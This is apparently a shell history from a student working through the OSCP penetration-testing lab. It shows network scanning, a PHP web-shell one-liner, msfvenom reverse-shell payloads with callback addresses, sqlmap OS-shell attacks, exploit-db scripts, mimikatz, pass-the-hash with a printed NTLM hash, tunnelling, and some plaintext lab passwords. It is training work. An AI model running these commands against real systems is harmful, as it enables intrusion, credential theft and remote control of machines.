 4307  2020-10-09 00:06  nmap --script smb-enum-shares.nse -p445 10.11.1.5
 4308  2020-10-09 00:16  nmap -sn 192.168.182.1/24 | grep is up
 4309  2020-10-09 00:16  nmap -sn 192.168.182.1/24 | grep is
 4310  2020-10-09 00:17  nmap -sn 192.168.182.1/24 | grep is > lol
 4311  2020-10-09 00:17  nmap -sn 192.168.182.1/24 | grep for > lol
 4312  2020-10-09 00:17  nmap -sn 192.168.182.1/24 | grep for
 4313  2020-10-09 00:18  nmap -sn 192.168.182.1/24
 4314  2020-10-09 00:21  nmap -A  192.168.182.1/24
 4315  2020-10-09 00:27  nmap 10.11.1.5
 4316  2020-10-09 00:47  #nmap sP 10.11.1.1-254 -oA nmapstuff.txt
 4317  2020-10-09 00:47  nmap sP 10.11.1.1-254 -oA nmapstuff.txt
 4318  2020-10-09 00:48  nmap -sP 10.11.1.1-254 -oA nmapstuff.txt
 4319  2020-10-09 00:51  grep  -o "10.11.1.*" nmapstuff.txt | grep -Eo '^[^ ]+'
 4320  2020-10-09 00:51  grep  -o "10.11.1.*" nmapstuff.txt.nmap | grep -Eo '^[^ ]+'
 4321  2020-10-09 00:52  grep  -o "10.11.1.*" nmapstuff.txt.nmap | grep -Eo '^[^ ]+' > web
 4322  2020-10-09 00:53  nmap -A -p80,443 -il web
 4323  2020-10-09 00:53  nmap -A -p80,443 -iL web
 4324  2020-10-09 01:07  nmap -sU -sS --script smb-* -p U:137, T:139 -iL web
 4325  2020-10-09 01:07  sudo nmap -sU -sS --script smb-* -p U:137, T:139 -iL web
 4326  2020-10-09 01:08  sudo nmap -sU -sS --script smb-* -p U:137,T:139 -iL web
 4327  2020-10-09 01:09  locate / | grep script
 4328  2020-10-09 01:09  sudo nmap -sU -sS --script usr/share/nmap/scripts/smb-* -p U:137,T:139 -iL web
 4329  2020-10-09 01:10  sudo nmap -sU -sS --script /usr/share/nmap/scripts/smb-* -p U:137,T:139 -iL web
 4330  2020-10-09 01:21  sudo nmap -sU -sS --script /usr/share/nmap/scripts/smb-* -p T:445 -iL web
 4331  2020-10-09 01:31  sudo nmap -sU -sS --script /usr/share/nmap/scripts/smb-* -p T:445 -iL web  > microsmb
 4332  2020-10-09 01:37  cat  microsmb | grep 1
 4333  2020-10-09 01:37  cat  microsmb | grep 10
 4334  2020-10-09 01:38  nmap  -sS --script /usr/share/nmap/scripts/smb-* -p T:445 -iL web  
 4335  2020-10-09 01:38  sudo nmap  -sS --script /usr/share/nmap/scripts/smb-* -p T:445 -iL web  
 4336  2020-10-09 01:43  sudo nmap  -sS --script /usr/share/nmap/scripts/smb-* -p T:445 -iL web  nbtscan 
 4337  2020-10-09 01:43  nbtscan 
 4338  2020-10-09 01:43  vim web 
 4339  2020-10-09 01:44  cat  web | grep open
 4340  2020-10-09 01:44  cat  microsmb | grep open
 4341  2020-10-09 01:44  cat  microsmb | grep 445
 4342  2020-10-09 01:45  vim  microsmb
 4343  2020-10-09 01:47  nbt
 4344  2020-10-09 02:08  rpcinfo -p | grep nfs
 4345  2020-10-09 02:11  #nmap -p 111,2049 --script=nfs-ls 
 4346  2020-10-09 02:12  nmap -p 111,2049 --script=nfs-ls 10.11.1.1-224
 4347  2020-10-09 02:13  nmap -p 111,2049 --script=nfs-ls 10.11.1.1/24
 4348  2020-10-09 02:17  cd /usr/share/nmap/scripts/
 4349  2020-10-09 02:20  cd Do
 4350  2020-10-09 02:20  sudo nmap  -sS --script /usr/share/nmap/scripts/nfs-* -iL web  
 4351  2020-10-09 02:23  nmap --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587 
 4352  2020-10-09 02:47  lnmap -p 25,465,587  --script=smtp-enum-users -iL web\n
 4353  2020-10-09 02:47  nmap -p 25,465,587  --script=smtp-enum-users -iL web\n
 4354  2020-10-09 03:32  touch mail.py
 4355  2020-10-09 03:32  vim m
 4356  2020-10-09 03:33  touch users.txt
 4357  2020-10-09 03:33  vim users.txt
 4358  2020-10-09 03:36  vim  mail.py
 4359  2020-10-09 03:36  python mail.py
 4360  2020-10-09 04:45  onesixtyone
 4361  2020-10-09 04:46  vim web
 4362  2020-10-09 04:48  onesixtyone 
 4363  2020-10-09 04:50  echo private >> community
 4364  2020-10-09 04:52  vim ips
 4365  2020-10-09 04:55  cat community
 4366  2020-10-09 04:59  ls\\n
 4367  2020-10-09 05:00  onesixtyone -c community -i web
 4368  2020-10-09 05:01  snmpwalk -c public -v1 -t 10 10.11.1.115
 4369  2020-10-09 05:02  snmp-check
 4370  2020-10-09 05:03  snmp-check 10.11.1.115
 4371  2020-10-09 05:03  snmp-check 10.11.1.227
 4372  2020-10-09 05:06  snmpwalk -c public -v1 -t 10 10.11.1.227
 4373  2020-10-09 05:24  sha256sum Nessus-X.X.X.deb
 4374  2020-10-09 05:24  cd unpacked
 4375  2020-10-09 05:26  sha256sum Nessus-8.12.0-debian6_amd64.deb
 4376  2020-10-09 05:28  sudo apt install ./Nessus-8.12.0-debian6_amd64.deb 
 4377  2020-10-09 05:29  sudo /etc/init.d/nessusd start
 4378  2020-10-09 05:29  sudo /bin/systemctl start nessusd.service\n
 4379  2020-10-09 21:43  cat OS-82638-PWK.ovpn
 4380  2020-10-09 21:47  nmap -sV --script=nfs-showmount 10.11.1.72
 4381  2020-10-09 21:58  top
 4382  2020-10-09 21:58  ps -a
 4383  2020-10-09 21:59  ps ax | grep firefox
 4384  2020-10-09 21:59  ps ax 
 4385  2020-10-09 21:59  ps ax | grep burp
 4386  2020-10-09 21:59  kill -9 $(ps -x | grep burp)
 4387  2020-10-09 23:16  ./pwk-82638-723655.pdf
 4388  2020-10-09 23:55  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 4389  2020-10-09 23:56  nc -nv 192.168.217.10 80
 4390  2020-10-10 00:04  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=443 -f exe > shell.exe
 4391  2020-10-10 00:14  touch evil.txt
 4392  2020-10-10 00:14  vim evil.hta
 4393  2020-10-10 00:14  vim evil.
 4394  2020-10-10 00:14  vim evil.txt
 4395  2020-10-10 00:49  cd /usr/share/webshells
 4396  2020-10-10 00:51  echo simple-backdoor.php >  simple-backdoor.php.php
 4397  2020-10-10 00:51  sudo echo simple-backdoor.php >  simple-backdoor.php.php
 4398  2020-10-10 00:52  nc -nv 192.168.217.10 443\n
 4399  2020-10-10 00:57  cd asp
 4400  2020-10-10 00:57  vim cmdasp.asp
 4401  2020-10-10 00:59  cp ~/evil.txt.php ./
 4402  2020-10-10 01:00  cp ~/evil.txt ./
 4403  2020-10-10 01:00  vim evil.txt.php
 4404  2020-10-10 01:05  cd /usr/share
 4405  2020-10-10 01:05  cd webshells
 4406  2020-10-10 01:06  cd aspx
 4407  2020-10-10 01:06  vim cmdasp.aspx
 4408  2020-10-10 01:06  cd php
 4409  2020-10-10 01:06  cd findsocket
 4410  2020-10-10 01:08  vim qsd-php-backdoor.php
 4411  2020-10-10 01:18  vimphp-backdoor.php
 4412  2020-10-10 01:18  vim php-backdoor.php
 4413  2020-10-10 01:18  vim simple-backdoor.php
 4414  2020-10-11 04:55  sqlmap -u http://192.168.217.10/debug.php\?id\=1 -p "id" --dbms=mysql --dump
 4415  2020-10-11 04:57  locate / | grep shell.exe
 4416  2020-10-11 05:00  rdesktop -u administrator -p easypasswordorelseforget  10.3.3.190
 4417  2020-10-11 05:05  sqlmap -u http://10.11.0.22/debug.php\?C:\users\Administrator\Desktop\\=1 -p "id" --dbms=mysql --os-shell
 4418  2020-10-11 05:05  sqlmap -u http://10.11.0.22/debug.php\?C:\users\Administrator\Desktop\\=1 -p "C:\users\Administrator\Desktop\" --dbms=mysql --os-shell
 4419  2020-10-11 05:06  sqlmap -u http://192.168.217.10/debug.php\?id\=1 -p "id" --dbms=mysql --os-shell
 4420  2020-10-12 08:47  lcoate / | grep fuzzer
 4421  2020-10-12 08:47  locate / | grep fuzzer
 4422  2020-10-12 08:49  MAC Address: 00:50:56:9F:9B:6A (VMware)
 4423  2020-10-12 08:57  touch fuzzer.py
 4424  2020-10-12 08:59  chmod +x fuzzer.py
 4425  2020-10-12 09:19  pwk-82638-723655.pdf
 4426  2020-10-12 09:36  python fuzzer.py
 4427  2020-10-12 18:55  cat cred.txt
 4428  2020-10-12 19:06  ./fuzzer.py
 4429  2020-10-12 19:14  touch crash2.py
 4430  2020-10-12 19:14  vim community
 4431  2020-10-12 19:14  rm community
 4432  2020-10-12 19:21  chmod +x crash2.py
 4433  2020-10-12 19:22  locate pattern_create
 4434  2020-10-12 19:23  msf-pattern_create -h
 4435  2020-10-12 19:23  msf-pattern_create -l 800
 4436  2020-10-12 19:28  msf-pattern_offset -l 800 -q 42306142
 4437  2020-10-12 22:45  vim bind.crt
 4438  2020-10-13 03:54  +
 4439  2020-10-13 06:33  msf-\nnasm_shell
 4440  2020-10-13 07:13  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 4441  2020-10-13 07:13  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 4442  2020-10-13 07:25  vim fuzzer.py
 4443  2020-10-13 18:48  linuxover.py
 4444  2020-10-13 18:48  touch linuxover.py
 4445  2020-10-13 18:49  chmod +x linuxover.py
 4446  2020-10-13 18:50  msf-pattern_create -l 4379\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac\n8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
 4447  2020-10-13 18:50  msf-pattern_create -l 4379 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
 4448  2020-10-13 18:52  msf-pattern_create -l 4379 
 4449  2020-10-13 18:59  msf-pattern_create -l 4379
 4450  2020-10-13 19:27  msf-nasm_shell
 4451  2020-10-13 23:18  msf-pattern_offset -q 46367046
 4452  2020-10-14 00:06  msf-pattern_offset -q 46367046  
 4453  2020-10-14 03:03  cat linuxover.py
 4454  2020-10-14 03:35  msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
 4455  2020-10-14 04:20  msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py
 4456  2020-10-14 04:20  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -b "\x00\x20" -f py
 4457  2020-10-14 06:21  #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -b "\x00\x20" -f py -v shellcode
 4458  2020-10-14 06:21  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -b "\x0\n0\x20" -f py -v shellcode
 4459  2020-10-14 06:22  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -b "\x00\x20" -f py -v shellcode
 4460  2020-10-14 06:31  ivm linuxover.py
 4461  2020-10-14 06:32  ./linuxover.py
 4462  2020-10-14 07:01  cd /var/www/html
 4463  2020-10-14 18:40  cd /var/www/html/
 4464  2020-10-14 18:40  cat evil.hta
 4465  2020-10-14 18:42  touch wordmacro
 4466  2020-10-14 18:42  vim wordmacro
 4467  2020-10-14 18:45  chmod +x wordmacro.py
 4468  2020-10-14 18:49  ./wordmacro.py
 4469  2020-10-14 18:50  python wordmacro.py
 4470  2020-10-14 19:26  socat TCP4:192.168.217.10:1234 file:Doc1.docx
 4471  2020-10-14 19:27  socat TCP4:192.168.217.10:1234 file:Doc1.docx,create
 4472  2020-10-14 19:30  mv Doc1.docx ~/oscpdata
 4473  2020-10-14 20:17  mv excelobject.xlsx ../oscpdata
 4474  2020-10-14 20:18  mv downloadword.docx ../oscpdata
 4475  2020-10-14 22:37  sudo nmap 192.168.217.44 -p- -sV -vv --open --reason
 4476  2020-10-15 08:18  cat /usr/share/exploitdb/exploits/linux/remote/35513.py
 4477  2020-10-15 08:19  python /usr/share/exploitdb/exploits/linux/remote/35513.py 192.162.217.44
 4478  2020-10-15 08:27  vim /usr/share/exploitdb/exploits/linux/remote/35513.py
 4479  2020-10-15 08:31  python /usr/share/exploitdb/exploits/linux/remote/35513.py 192.168.217.44
 4480  2020-10-15 18:36  searchsploit "Sync Breeze Enterprise 10.0.28"
 4481  2020-10-15 18:36  locate Sync Breeze Enterprise 10.0.28
 4482  2020-10-15 18:37  locate windows/dos/42341.c
 4483  2020-10-15 18:38  sudo apt install mingw-w64
 4484  2020-10-15 18:38  i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 4485  2020-10-15 18:44  vim syncbreeze_exploit.exe
 4486  2020-10-15 18:50  ./syncbreeze_exploit.exe
 4487  2020-10-15 18:53  wine]
 4488  2020-10-15 19:17  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
 4489  2020-10-15 20:02  vivm 42341.c
 4490  2020-10-15 21:04  searchsploit testrail
 4491  2020-10-15 21:04  searchsploit test rail
 4492  2020-10-15 21:04  searchsploit test 
 4493  2020-10-15 21:37  touch fixingtheexploit.c
 4494  2020-10-15 22:58  searchsploit james
 4495  2020-10-15 22:58  locate linux/remote/35513.py
 4496  2020-10-15 22:58  cp /usr/share/exploitdb/exploits/linux/remote/35513.py ./
 4497  2020-10-15 23:31  ssh student@192.168.217.44
 4498  2020-10-15 23:33  python 35513.py
 4499  2020-10-15 23:36  python 35513.py 192.168.217.44
 4500  2020-10-16 07:04  locate 42341.c
 4501  2020-10-16 07:04  rm 42341.c
 4502  2020-10-16 07:04  cp /usr/share/exploitdb/exploits/windows/dos/42341.c ./
 4503  2020-10-16 07:30  rm syncbreeze_exploit.exe
 4504  2020-10-16 07:55  i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 4505  2020-10-16 07:55  wine syncbreeze_exploit.exe
 4506  2020-10-16 09:14  locate 38382
 4507  2020-10-16 09:14  cp /usr/share/exploitdb/exploits/windows/local/38382.py ./
 4508  2020-10-16 09:20  gcc
 4509  2020-10-16 09:20  gcc lol.c
 4510  2020-10-16 09:20  vim linuxover.py
 4511  2020-10-16 09:25  touch test.py
 4512  2020-10-16 09:25  chmod +x test.py
 4513  2020-10-16 09:26  cat crash2.py
 4514  2020-10-16 09:27  vim access_log.txt
 4515  2020-10-16 09:28  rm access_log.txt
 4516  2020-10-16 09:30  vim Evil_Payload.asx
 4517  2020-10-16 09:44  msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0a\x1a" -f python -v payload
 4518  2020-10-16 09:45  chmod +x lol.c 
 4519  2020-10-16 09:46  wine f
 4520  2020-10-16 09:52  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x09\x1a\x25"
 4521  2020-10-16 10:13  vim test.py
 4522  2020-10-16 10:15  ./test.py
 4523  2020-10-16 10:24  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f c –e x86/xor_dynamic  -b "\x00\x0a\x09\x1a\x25"
 4524  2020-10-16 10:25  vim lol.c
 4525  2020-10-16 10:26  i686-w64-mingw32-gcc lol.c -o file.exe -lws2_32
 4526  2020-10-16 10:26  wine file.exe
 4527  2020-10-16 21:11  locate 44976
 4528  2020-10-16 21:12  cp /usr/share/exploitdb/exploits/php/webapps/44976.py ./
 4529  2020-10-16 21:41  cd 8
 4530  2020-10-16 22:02  cd 10.1.1.1
 4531  2020-10-16 22:02  cherrytree luigi.ctb
 4532  2020-10-16 22:07  python -m SimpleHTTPServer 8000
 4533  2020-10-16 22:08  python -m SimpleHTTPSServer 80
 4534  2020-10-16 22:09  vim https.py
 4535  2020-10-16 22:09  chmod +x https.py
 4536  2020-10-16 22:10  python simple-https-server.py
 4537  2020-10-16 22:10  python https.py
 4538  2020-10-16 22:21  systemctl start apache2.service
 4539  2020-10-16 22:22  systemctl stop  apache2.service
 4540  2020-10-16 23:26  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f powershell
 4541  2020-10-16 23:45  chmod +x hide.ps1
 4542  2020-10-17 00:00  vim hide.ps1
 4543  2020-10-17 00:13  sudo nc -nlvp 80
 4544  2020-10-17 00:21  sudo apt install shellter
 4545  2020-10-17 01:14  shelder
 4546  2020-10-17 01:14  shelter
 4547  2020-10-17 01:17  locate / | grep wrar
 4548  2020-10-17 01:20  cd ~/Downloads/
 4549  2020-10-17 01:21  shellter
 4550  2020-10-17 02:03  d /usr/share/windows-binaries
 4551  2020-10-17 02:03  cd d /usr/share/windows-binaries
 4552  2020-10-17 02:04  cd /usr/share/windows-binaries
 4553  2020-10-17 02:09  sudo shellter
 4554  2020-10-17 03:09  locate / | grep ccesschk.exe 
 4555  2020-10-17 03:10  cp /home/kali/OSCP/results/10.11.1.14/exploit/accesschk.exe ./
 4556  2020-10-17 07:01  git clone https://github.com/pentestmonkey/windows-privesc-check.git
 4557  2020-10-17 07:02  cd windows-privesc-check
 4558  2020-10-17 07:12  untar unix-privesc-check-1.4.tar.gz
 4559  2020-10-17 07:13  sudo gunzip  unix-privesc-check-1.4.tar.gz
 4560  2020-10-17 07:49  tar -xzf  ./unix-privesc-check-1.4.tar.gz
 4561  2020-10-17 07:50  tar -xzf  unix-privesc-check-1.4.tar.gz
 4562  2020-10-17 07:58  tar -xvf unix-privesc-check-1.4.tar.gz
 4563  2020-10-17 07:59  rm unix-privesc-check-1.4.tar.gz
 4564  2020-10-17 08:03  /usr/bin/unix-privesc-check
 4565  2020-10-17 08:03  .//usr/bin/unix-privesc-check
 4566  2020-10-17 08:03  cd /usr/bin/unix-privesc-check
 4567  2020-10-17 08:03  cd /usr/bin/
 4568  2020-10-17 08:03  find / 2>/dev/null | grep unix-privesc
 4569  2020-10-17 08:05  unix-privesc-check
 4570  2020-10-17 08:09  cd /usr/share/unix-privesc-check
 4571  2020-10-17 08:10  ./unix-privesc-check standard > output.txt
 4572  2020-10-17 08:10  sudo ./unix-privesc-check standard > output.txt
 4573  2020-10-17 08:12  vim output.txt
 4574  2020-10-17 08:27  rdesktop -u lab -p lab  192.168.217.10
 4575  2020-10-17 08:27  rdesktop -u admin -p lab  192.168.217.10
 4576  2020-10-17 11:08  vim lmao.c
 4577  2020-10-17 11:09  i686-w64-mingw32-gcc lmao.c -o adduser.exe
 4578  2020-10-17 11:20  rdesktop -u evil  -p Ev192.168.217.10
 4579  2020-10-17 11:21  rdesktop -u evil  -p Ev 192.168.217.10
 4580  2020-10-17 11:21  rdesktop -u evil  -p "Ev 192.168.217.10
 4581  2020-10-17 11:21  rdesktop -u evil  192.168.217.10
 4582  2020-10-17 11:28  c d
 4583  2020-10-17 11:32  cherry adam.ctb
 4584  2020-10-17 11:33  cd ~/OSCP/dev_dept/10.2.2.86/report
 4585  2020-10-17 11:33  cherrytree john.ctb
 4586  2020-10-17 11:58  rdesktop -u student  -p lab  192.168.217.44
 4587  2020-10-17 12:27  locate / | grep mimi
 4588  2020-10-17 12:27  cp /home/kali/OSCP/it_dept/results/10.1.1.235/exploit/mimikatz_x86.exe ./
 4589  2020-10-17 12:31  rm mimikatz_x86.exe
 4590  2020-10-17 12:31  cp /home/kali/OSCP/results/10.11.1.220/exploit/mimikatz.exe ./
 4591  2020-10-17 12:36  cd 10.11.1.200
 4592  2020-10-17 12:36  cd 10.11.1.220
 4593  2020-10-17 12:36  cherrtytree master.ctb
 4594  2020-10-17 12:36  cherrttree master.ctb
 4595  2020-10-17 12:37  cherrytree master.ctb
 4596  2020-10-17 12:39  python /home/kali/.local/bin/wmiexec.py  -hashes AAD3B435B51404EEAAD3B435B51404EE:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.119.217
 4597  2020-10-17 12:40  python /home/kali/.local/bin/wmiexec.py  -hashes AAD3B435B51404EEAAD3B435B51404EE:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.217.10
 4598  2020-10-17 12:42  pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.217.10 cmd
 4599  2020-10-17 21:26  sudo apt update && sudo apt install rinetd
 4600  2020-10-17 21:27  vim /etc/rinetd.conf 
 4601  2020-10-17 21:27  sudo vim /etc/rinetd.conf 
 4602  2020-10-17 21:28  ss -antp | grep "80"
 4603  2020-10-17 21:30  vim /etc/rinetd.conf
 4604  2020-10-17 21:34  sudo service rinetd restart
 4605  2020-10-17 21:43  sudo vim /etc/rinetd.conf
 4606  2020-10-17 21:50  sudo ssh -N -L 0.0.0.0:445:192.168.119.217:445 student@192.168.217.44
 4607  2020-10-17 21:52  cat /etc/samba/smb.conf
 4608  2020-10-17 22:01  vim /etc/samba/smb.conf
 4609  2020-10-17 22:11  sudo /etc/init.d/smbd start
 4610  2020-10-17 22:22  rdesktop -u administrator -p lab  172.16.217.5
 4611  2020-10-17 22:48  sudo /etc/init.d/smbd stop
 4612  2020-10-17 22:50  sudo ssh -N -L 0.0.0.0:445:172.16.217.5:445 student@192.168.217.44
 4613  2020-10-17 22:51  sudo /etc/init.d/smbd restart
 4614  2020-10-17 22:51  smbclient -L 127.0.0.1 -U Administrator
 4615  2020-10-17 22:52  sudo vim /etc/samba/smb.conf
 4616  2020-10-17 23:18  ssh -N -R 192.168.119.217:2221:127.0.0.1:3306 kali@192.168.119.217
 4617  2020-10-17 23:21  ss -antp | grep "2221"
 4618  2020-10-17 23:21  sudo nmap -sS -sV 127.0.0.1 -p 2221
 4619  2020-10-17 23:22  mysql -h 127.0.0.1 -P 2221 -u kali -p 
 4620  2020-10-17 23:22  mysql -h 127.0.0.1 -P 2221 -u kali -p kali
 4621  2020-10-17 23:24  mysql -h 127.0.0.1 -P 2221 -u root -p 
 4622  2020-10-17 23:24  mysql -h 127.0.0.1 -P 2221 -u student -p 
 4623  2020-10-17 23:33  ss -antp | grep "8080" 
 4624  2020-10-17 23:34  sudo ssh student@192.168.217.44
 4625  2020-10-17 23:41  sudo ssh -N -D 127.0.0.1: student@192.168.217.44u
 4626  2020-10-17 23:41  cat /etc/proxychains.conf
 4627  2020-10-17 23:41  sudo ssh -N -D 127.0.0.1:9050 student@192.168.217.44u
 4628  2020-10-17 23:43  sudo ssh -N -D 127.0.0.1:8080 student@192.168.217.44\n
 4629  2020-10-17 23:43  sudo service tor stats
 4630  2020-10-17 23:45  sudo service tor restat
 4631  2020-10-17 23:46  cat ~/OSCP/dev_dept/10.2.2.150
 4632  2020-10-17 23:46  cat ~/OSCP/dev_dept/10.2.2.150/
 4633  2020-10-17 23:47  cat ~/OSCP/dev_dept/
 4634  2020-10-17 23:47  cat ~/OSCP/dev_dept/10.3.3.31/scans/drib
 4635  2020-10-17 23:48  proxychains rdesktop -u john -p easyas123 10.2.2.86
 4636  2020-10-18 00:00  c
 4637  2020-10-18 00:04  service tor start
 4638  2020-10-18 00:05  sudo ssh -N -D 127.0.0.1:8080 j0hn@10.11.1.252 -p 22000
 4639  2020-10-18 00:15  sudo proxychains nmap --top-ports=20 -sT -Pn 172.16.217.5u
 4640  2020-10-18 00:16  proxychains nmap 10.2.2.31\n
 4641  2020-10-18 00:17  /etc/init.d/privoxy restart
 4642  2020-10-18 00:26  ssh -N -D 127.0.0.1:8080 j0hn@10.11.1.252 -p 22000
 4643  2020-10-18 00:29  /etc/init.d/tor restart\n
 4644  2020-10-18 00:30  /etc/init.d/privoxy restart\n
 4645  2020-10-18 00:33  sudo proxychains ssh   -v -N -D 9050 j0hn@10.11.1.252 -p 22000 
 4646  2020-10-18 00:34  ss -antp | grep "9050" 
 4647  2020-10-18 00:35  sudo lsof -i :9050
 4648  2020-10-18 00:36  proxychains firefox\n
 4649  2020-10-18 00:37  proxychains nmap -sT 10.2.2.31\n
 4650  2020-10-18 00:40  proxychains nmap -sT -v 10.2.2.31\n
 4651  2020-10-18 00:41  proxychains nmap -sT -v 10.11.1.13
 4652  2020-10-18 00:41  vim /etc/proxychains.conf
 4653  2020-10-18 00:45  source  /etc/proxychains.conf
 4654  2020-10-18 00:45  sudo service tor restart
 4655  2020-10-18 00:45  proxychains nmap -sT -v 127.0.0.1
 4656  2020-10-18 00:45  sudo proxychains nmap -sT -v 127.0.0.1
 4657  2020-10-18 00:45  sudo proxychains nmap - 127.0.0.1
 4658  2020-10-18 00:45  sudo proxychains nmap  127.0.0.1
 4659  2020-10-18 00:46  sudo proxychains nmap  10.2.2.31
 4660  2020-10-18 00:48  sudo proxychains nmap  10.2.2.150
 4661  2020-10-18 00:49  sudo  proxychains nmap  -sT 10.2.2.150
 4662  2020-10-18 00:50  ssh   -v -N -D 8080 j0hn@10.11.1.252 -p 22000
 4663  2020-10-18 00:53  export /etc/proxychains.conf
 4664  2020-10-18 00:53  sudo  /etc/proxychains.conf
 4665  2020-10-18 00:55  sudo ssh -N -D 127.0.0.1:8080 student@192.168.217.44
 4666  2020-10-18 00:57  sudo /etc/proxychains.conf 
 4667  2020-10-18 00:57  sudo vim /etc/proxychains.conf 
 4668  2020-10-18 00:57  sudo service tor stop
 4669  2020-10-18 00:57  sudo ssh -N -D 127.0.0.1:9050 student@192.168.217.44
 4670  2020-10-18 00:58  sudo service tor start
 4671  2020-10-18 00:58  sudo proxychains nmap --top-ports=20 -sT -Pn 172.16.217.5
 4672  2020-10-18 01:10  sudo proxychains nmap --top-ports=20  172.16.217.5
 4673  2020-10-18 02:20  c oscpdata
 4674  2020-10-18 02:20  ss -antp | grep "80" 
 4675  2020-10-18 02:22  kill -9 $(ps -x | grep firefox)
 4676  2020-10-18 02:22  sudo proxychains firefox\n
 4677  2020-10-18 02:23  sudo service tor status
 4678  2020-10-18 02:23  $  ssh   -v -N -D 9050 j0hn@10.11.1.252 -p 22000  
 4679  2020-10-18 02:23  john pass bzuisJDnuI6WUDl
 4680  2020-10-18 02:29  kill $(lsof -t -i:80)
 4681  2020-10-18 02:29  kill $(lsof -t -i:8080)
 4682  2020-10-18 02:30  kill -9 $(lsof -t -i:80 -sTCP:LISTEN)\n\n
 4683  2020-10-18 02:31  netstat -ano | findstr 80
 4684  2020-10-18 02:31  netstat -ano | grep  80
 4685  2020-10-18 02:32  lsof -i:8080
 4686  2020-10-18 02:33  sudo kill -9 577
 4687  2020-10-18 03:00  cd /usr/share/windows-resources/binaries/
 4688  2020-10-18 03:43  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
 4689  2020-10-18 03:48  vim ~/.ssh/config
 4690  2020-10-18 03:57  source  ~/.ssh/config
 4691  2020-10-18 03:57  sudo systemctl restart sshd.service\n
 4692  2020-10-18 04:01  scd report
 4693  2020-10-18 04:32  cd /home/kali/OSCP/results/10.11.1.50/exploit/
 4694  2020-10-18 04:41  locate / | grep plink.ex
 4695  2020-10-18 06:55  ls -l /mnt/win10_share/
 4696  2020-10-18 06:55  cat /mnt/win10_share/data.txt
 4697  2020-10-18 07:30  sudo apt install httptunne
 4698  2020-10-18 07:30  sudo apt install httptunnel
 4699  2020-10-18 07:31  /etc/init.d/apache2 start
 4700  2020-10-18 07:39  whoami
 4701  2020-10-18 08:37  sudo nmap -sS -sV 127.0.0.1 -p 1234\n
 4702  2020-10-18 08:41  ./crash2.py 
 4703  2020-10-18 09:26  sudo nmap -sS -sV 127.0.0.1 -p 1234
 4704  2020-10-18 09:46  ./crash2.py
 4705  2020-10-18 10:17  smbclient -L 192.168.217.10 --port=4455 --user=Administrator
 4706  2020-10-18 10:21  sudo mkdir /mnt/win10_share
 4707  2020-10-18 10:21  sudo mount -t cifs -o port=4455 //192.168.217.10/Data -o username=Administrator,password=lab /mnt/win10_share
 4708  2020-10-18 10:22  ls -al /mnt/win10_share/
 4709  2020-10-18 10:22  cat /mnt/win10_share/data.txt 
 4710  2020-10-18 11:00  ssh root@192.168.217.44
 4711  2020-10-18 18:34  .vim 44976.py
 4712  2020-10-18 18:34  ./44976.py
 4713  2020-10-18 18:55  htc --forward-port 8080 192.168.217.44:1234\n
 4714  2020-10-18 18:55  ps aux | grep htc
 4715  2020-10-18 19:01  rdesktop 127.0.0.1:8080
 4716  2020-10-20 01:05  rdesktop -u student -p pass   192.168.217.10
 4717  2020-10-20 08:32  rdesktop -u jeff_admin  -p lab  192.168.217.10
 4718  2020-10-20 08:33  rdesktop -u student  -p lab  192.168.217.10
 4719  2020-10-20 09:15  rdesktop -u jeff_admin  -p   192.168.217.10
 4720  2020-10-20 09:15  rdesktop -u "jeff_admin"  -p   192.168.217.10
 4721  2020-10-20 09:15  rdesktop -u student  -p   192.168.217.10
 4722  2020-10-20 09:28  locate /  | grep DownloadString
 4723  2020-10-20 09:35  locate /  | grep powerveiw
